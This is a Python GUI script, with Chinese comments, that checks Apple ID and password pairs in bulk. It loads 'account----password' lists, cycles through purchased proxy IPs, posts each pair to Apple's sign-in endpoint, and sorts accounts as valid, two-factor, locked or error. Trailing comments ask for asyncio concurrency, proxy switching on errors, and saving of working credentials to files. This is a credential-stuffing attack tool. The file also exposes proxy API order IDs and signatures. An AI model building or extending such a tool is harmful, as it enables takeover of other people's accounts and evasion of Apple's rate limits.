# coding: utf-8
import requests
from threading import Lock, Event  # 导入Lock和Event用于线程同步
import logging
import PySimpleGUI as sg
import queue
import time

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# 定义窗口的内容
row1 = [sg.Text("总数", size=(8, 1)),
        sg.Text("正确", size=(6, 1)),
        sg.Text("双重", size=(8, 1)),
        sg.Text("被锁", size=(6, 1)),
        sg.Text("错误", size=(8, 1))]
row2 = [sg.Text("-", size=(8, 1), key="-COUNT-"),
        sg.Text("-", size=(8, 1), key="-CORRECT-"),
        sg.Text("-", size=(8, 1), key="-2FA-"),
        sg.Text("-", size=(8, 1), key="-LOCKED-"),
        sg.Text("-", size=(8, 1), key="-ERROR-")]
row3 = [[sg.Text("输入文件：", size=(8, 1)), sg.InputText(key="-APPLEIDFILE-", size=(25, 1)),
         sg.FileBrowse(button_text="选择文件", file_types=(("文本文件", "*.txt"),))],
        [sg.Text("代理接口：", size=(8, 1)), sg.Input(key='-PROXYURL-', size=(35, 1))],
        [sg.Text("线程数量：", size=(8, 1)), sg.Input(key='-THREAD-', size=(35, 1))],
        [sg.Text("检测进度：", size=(8, 1)), sg.ProgressBar(1, orientation='h', size=(
            25, 15), key='progress', bar_color=('green', 'white'))]]
row4 = [sg.Button('Start'), sg.Button('Stop'), sg.Button('View')]

# 定义窗口的布局
layout = [[sg.Column([
    [sg.Frame('检测结果：', [row1, row2])],
    [sg.Frame('检测设置：', row3)],
    [sg.Frame('检测控制：', [row4])]
])]]

# 创建窗口
window = sg.Window('Apple ID 检存工具', layout)

# 进度条
# progress_bar = window['progress']
# 通常会做一些有用的循环
# for i in range(10000):
#     # check to see if the cancel button was clicked and exit loop if clicked
#     event, values = window.read(timeout=0)
#     if event == 'Cancel' or event == None:
#         break
#     # 检查是否单击了取消按钮，如果单击则退出循环
#     progress_bar.update_bar(i+1, 10000)
# 循环完成...需要销毁窗口，因为它仍然打开

##############
#  代理IP部分  #
##############
# 定义常量：代理API的URL和每次获取代理的数量
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIp?type=1&num=200&pid=-1&unbindTime=180&cid=-1&orderId=O23110722352356692123&time=1699738697&sign=4bc1e1ba75c91b0da7d6328552104498&noDuplicate=1&dataType=1&lineSeparator=0'
NUM_PROXIES_TO_FETCH = 300

# 初始化代理队列和线程同步对象
proxy_queue = queue.Queue()
proxy_queue_lock = Lock()
stop_event = Event()

# 定义线程安全的代理队列填充函数
def replenish_proxy_queue_thread_safe(NUM_PROXIES_TO_FETCH):
    # 当代理数量小于200时，重新填充代理队列
    while not stop_event.is_set():  # 循环直到外部事件触发停止
        with proxy_queue_lock:  # 锁定代理队列进行操作
            # 如果代理数量少于200，则填充代理队列
            if proxy_queue.qsize() < NUM_PROXIES_TO_FETCH:
                logger.info("Replenishing proxy queue...")
                try:
                    response = requests.get(PROXY_API_URL)
                    proxies = response.text.strip().split('\n')
                    for proxy in proxies:
                        cleaned_proxy = proxy.strip()  # 移除每个代理字符串开头和结尾的空白字符
                        if cleaned_proxy:  # 确保代理不是空字符串
                            proxy_queue.put(cleaned_proxy)  # 将清理后的代理加入队列
                        # print(proxy)
                    logger.info("Added new proxies to the queue. count: " + str(proxy_queue.qsize()))
                except Exception as e:
                    logger.error(f"Failed to fetch new proxies: {e}")
        time.sleep(10)  # 每10秒检查一次队列大小


# 使其只负责获取代理并填充到队列中，不在这个函数内部进行数量检查
def fetch_and_replenish_proxy_queue():
    try:
        response = requests.get(PROXY_API_URL)
        proxies = response.text.strip().split('\n')
        for proxy in proxies:
            proxy_queue.put(proxy)
        logger.info("Added new proxies to the queue.")
    except Exception as e:
        logger.error(f"Error fetching proxies: {e}")

################
# Apple ID 队列 #
################
# 定义一个用于存储Apple ID和密码的队列
apple_id_queue = queue.Queue()

def parse_file_and_load_queue(file_path):
    with open(file_path, 'r') as file:
        for line in file:
            line = line.strip()  # 移除字符串两端的空白字符（包括换行符）
            if line:  # 确保行不是空的
                apple_id, password = line.split('----')  # 分割Apple ID和密码
                apple_id_queue.put((apple_id, password))  # 将数据存入队列
                print(apple_id, password)

##############
# 检测接口部分 #
##############
# PROXY_API_URL = 'https://proxyapi.horocn.com/api/v2/proxies?order_id=VWSR1781923674547744&num=1&format=text&line_separator=win&can_repeat=no&user_token=ce551c5cc5516050cb2682d4f59fbae0'
PROXY_API_URL = 'https://api.hailiangip.com:8522/api/getIpEncrypt?dataType=1&encryptParam=SlDyzgfgDW12vuaMHmQkMzKSlRTuS%2Bu596hwGK%2Fn1zdLwdnbtCj6lZ7A01EG1vOxmvG5TixsGA9ws53lyrDV2TWc1V83TrOf0PxovyU%2BhrnrtCCCN4n199AbybZL3S3VfwKWOgbx%2BXCRKemZTKxtvdkQYlsoImld%2F5vlzY5PF%2FwP9g7Wglmrt2EnuIbvDg0FlYUCoWjGZqpyo%2BRyt5I2dl0tw%2B%2FCVyzsGA8L1XDZpXg%3D'
URL = 'https://idmsa.apple.com/appleauth/auth/signin'
HEADERS = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "X-Apple-Locale": "QT-EN",
    "X-Apple-Trusted-Domain": "https://idmsa.apple.com",
    "Origin": "https://idmsa.apple.com",
    "X-Requested-With": "XMLHttpRequest"
}
PASSWORD_CORRECT_MESSAGE = 'authType'
PASSWORD_INCORRECT_MESSAGE = 'incorrect'
CLOSED_ACCOUNT_MESSAGE = 'locked'

# Lock for thread safety
lock = Lock()


class AppleIDChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)

    def get_proxy(self):
        response = requests.get(PROXY_API_URL)
        # print(response.text)
        if response.ok:
            # Assuming the API returns just the IP:Port in the response body
            proxy_ip = response.text.strip()
            return {
                "http": f"http://{proxy_ip}",
                "https": f"http://{proxy_ip}"
            }
        else:
            logger.error("获取代理IP失败。")
            return None

    def try_login(self, apple_id, password):
        proxy = self.get_proxy()
        print(proxy)
        if not proxy:
            return {"status": "无法获取代理IP，登录请求失败。"}

        try:
            with lock:  # Ensure only one thread accesses the proxy at a time
                response = self.session.post(URL, json={
                                            "accountName": apple_id, "password": password, "rememberMe": False}, proxies=proxy)
                return self.process_response(apple_id, password, response.text)
        except requests.RequestException as e:
            logger.error(f'HTTP错误: {e}')
            return {"error": "尝试登录时发生HTTP错误。"}

    def process_response(self, apple_id, password, response_text):
        if PASSWORD_CORRECT_MESSAGE in response_text:
            logger.info(f'密码正确 AppleID -> {apple_id}:{password}')
            result = {"status": "密码正确", "message": "帐号密码正确。"}
        elif PASSWORD_INCORRECT_MESSAGE in response_text:
            logger.info(f'密码错误 AppleID -> {apple_id}:{password}')
            result = {"status": "密码错误", "message": "帐号密码错误。"}
        elif CLOSED_ACCOUNT_MESSAGE in response_text:
            logger.info(f'账户已锁定 AppleID -> {apple_id}:{password}')
            result = {"status": "帐号被锁", "message": "此Apple ID因安全原因已被锁定。"}
        else:
            logger.error(f'错误 AppleID -> {apple_id}:{password}')
            logger.error(f'错误信息 -> {response_text}')
            result = {"status": "未知错误", "message": "出现未知错误。"}

        return result


# Display and interact with the Window using an Event Loop
while True:
    event, values = window.read()
    # 如果用户点击“Start”，处理文件
    if event == 'Start':
        appleid_file_path = values["-APPLEIDFILE-"]
        thread_num = values["-THREAD-"]
        proxy_url = values["-PROXYURL-"]

        print(f"选择的文件路径是: {appleid_file_path}")
        # 在这里，您可以添加处理文件的代码
        # 解析文件并将数据加载到队列中
        parse_file_and_load_queue(appleid_file_path)
        print(f"队列中的数据数量：{apple_id_queue.qsize()}")

    # See if user wants to quit or window was closed
    if event == sg.WINDOW_CLOSED or event == 'Quit':
        break
    # Output a message to the window


# Finish up by removing from the screen
window.close()
# 请帮我对以下代码添加一些功能，具体要求如下：
# 1. 使用队列维护一个代理IP池。
# 2. 使用队列维护一个帐号密码对池。
# 3. 使用asyncio协程异步并发检测帐号密码对。
# 4. 并发数量可以通过GUI界面设置（默认并发数量为10）。
# 5. 当帐号密码对池中的帐号密码对数量小于并发数量时，并发数量为帐号密码对池中的数量。
# 6. 当帐号密码对池中的帐号为空时，停止检测。
# 5. 但检测发生http错误时，需要更换代理IP并重新检测（把帐号密码对放回队列）。
# 6. 检测的结果需要在GUI界面中实时显示。需要显示的内容有：总数、正确、双重、被锁、错误的数量。
# 7. 检测时同步更新进度条。
# 8. 检测时同步把检测「正确」和「双重」的结果分别写入一个新文件夹下的两个文件中。